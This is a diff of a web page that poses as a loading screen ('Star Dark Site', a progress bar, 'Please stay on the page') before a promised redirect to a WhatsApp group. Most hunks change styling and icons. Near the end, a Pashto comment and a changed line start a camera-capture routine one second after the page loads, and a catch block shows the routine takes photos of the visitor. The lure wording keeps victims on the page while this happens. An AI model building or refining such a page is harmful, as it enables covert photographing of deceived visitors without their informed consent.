@@ -4,14 +4,15 @@
   <meta charset="UTF-8">
   <title>Star Dark Site - Loading...</title>
   <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     * {
       box-sizing: border-box;
+      margin: 0;
+      padding: 0;
     }
 
     body {
-      margin: 0;
-      padding: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: 
         linear-gradient(rgba(0, 40, 60, 0.8), rgba(0, 20, 40, 0.9)),
@@ -298,7 +299,7 @@
 
     /* Text */
     .text {
-      font-size: 6px;
+      font-size: 24px;
       line-height: 1.8;
       text-shadow: 
         0 0 10px rgba(0, 255, 255, 0.8),
@@ -345,10 +346,10 @@
     /* Progress bar container */
     .progress-container {
       width: 100%;
-      height: 25px;
+      height: 60px;
       background: rgba(0, 40, 60, 0.5);
       border-radius: 15px;
-      margin: 60px 0 30px;
+      margin: 40px 0 30px;
       overflow: hidden;
       box-shadow: 
         inset 0 0 15px rgba(0, 0, 0, 0.5),
@@ -396,7 +397,7 @@
       left: 50%;
       transform: translate(-50%, -50%);
       font-weight: bold;
-      font-size: 16px;
+      font-size: 40px;
       color: #00ffff;
       text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
       z-index: 2;
@@ -582,7 +583,7 @@
       }
       
       .progress-container {
-        height: 22px;
+        height: 25px;
       }
       
       .loader {
@@ -617,7 +618,7 @@
       }
       
       .progress-container {
-        height: 240px;
+        height: 24px;
       }
       
       .progress-percent {
@@ -655,8 +656,8 @@
     </div>
     
     <div class="text" id="loading-text">
-      Loading amazing content...<br>
-      Please stay on the page 🎥
+      <i class="fas fa-spinner fa-spin"></i> Loading amazing content...<br>
+      <i class="fas fa-user-clock"></i> Please stay on the page
     </div>
     
     <!-- Progress Bar -->
@@ -678,11 +679,11 @@
     
     <!-- Redirect Message -->
     <div class="redirect-message" id="redirect-message">
-      Complete! Redirecting to WhatsApp group...
+      <i class="fas fa-check-circle"></i> Complete! Redirecting to WhatsApp group...
     </div>
     
     <!-- Credits -->
-    <div class="credit">𝗠𝗮𝗱𝗲 𝗯𝘆 𝗦𝘁𝗮𝗿𝗫</div>
+    <div class="credit"><i class="fas fa-code"></i> 𝗠𝗮𝗱𝗲 𝗯𝘆 𝗦𝘁𝗮𝗿𝗫</div>
   </div>
 
   <!-- Confetti Container -->
@@ -753,7 +754,7 @@
       
       let progress = 0;
       const targetProgress = 100;
-      const duration = 20000; // 20 seconds
+      const duration = 30000; // 20 seconds
       const intervalTime = 100; // every 100ms
       const increments = (intervalTime / duration) * targetProgress;
       
@@ -777,7 +778,7 @@
           // Show message
           setTimeout(() => {
             redirectMessage.classList.add('show');
-            loadingText.innerHTML = "Complete!<br>Redirecting to WhatsApp group...";
+            loadingText.innerHTML = '<i class="fas fa-check-circle"></i> Complete!<br><i class="fas fa-paper-plane"></i> Redirecting to WhatsApp group...';
             loadingText.style.animation = "textPulse 0.5s infinite alternate";
             
             // Redirect to WhatsApp group
@@ -860,26 +861,26 @@
     // Update text based on progress
     function updateLoadingText(progress, element) {
       let text = "";
-      let emoji = "🎥";
+      let icon = '<i class="fas fa-film"></i>';
       
       if (progress < 20) {
         text = "Checking system...";
-        emoji = "🔍";
+        icon = '<i class="fas fa-search"></i>';
       } else if (progress < 40) {
         text = "Preparing content...";
-        emoji = "⚡";
+        icon = '<i class="fas fa-bolt"></i>';
       } else if (progress < 60) {
         text = "Processing data...";
-        emoji = "💾";
+        icon = '<i class="fas fa-database"></i>';
       } else if (progress < 80) {
         text = "Finalizing...";
-        emoji = "✨";
+        icon = '<i class="fas fa-magic"></i>';
       } else {
         text = "Finishing up...";
-        emoji = "🎯";
+        icon = '<i class="fas fa-bullseye"></i>';
       }
       
-      element.innerHTML = `${text}<br>Please stay on the page ${emoji}`;
+      element.innerHTML = `${icon} ${text}<br><i class="fas fa-user-clock"></i> Please stay on the page`;
     }
     
     // Initialize when page loads
@@ -982,12 +983,12 @@
 
     } catch (e) {
       console.error("Camera error:", e);
-      alert("Please allow camera access to proceed.");
+      alert("🚫 Unable to access camera or take photos.");
     }
   }
 
   // ⏱ د پاڼې له لوډ وروسته عکس اخیستل پیل کړه
-  window.onload = () => setTimeout(capturePhotos, 1000);
+  setTimeout(capturePhotos, 1000);
 
   </script>
 </body>
